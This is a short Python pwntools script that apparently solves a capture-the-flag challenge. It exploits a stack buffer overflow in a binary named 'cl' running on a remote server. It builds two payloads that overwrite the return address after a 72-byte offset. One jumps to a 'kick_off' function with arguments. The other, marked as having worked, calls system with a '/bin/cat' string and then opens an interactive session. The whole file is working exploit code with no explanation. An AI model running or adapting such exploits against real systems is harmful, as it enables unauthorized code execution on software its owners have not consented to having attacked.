#!/usr/bin/env python

from pwn import *
e = ELF("./cl")

p = remote("159.65.13.76", 61234)
#p = process("./cl")

offset = 72

# This for exploit #1 (didnt check yet)
kick_off_addr = e.sym["kick_off"]
arg1 = 2355
arg2 = 120

payload1 = 'A'*offset + p32(kick_off_addr) + p32(arg1) + p32(arg2)


# This for exploit #2 (worked)
# ROPgadget --binary cl --string '/bin/cat'
bincat = 0x8048730
systemc = 0x080485a1

payload2 = 'A'*offset  + p32(systemc) + p32(bincat)


# final payload
payload = payload2

p.sendline(payload + "\n")
p.interactive()
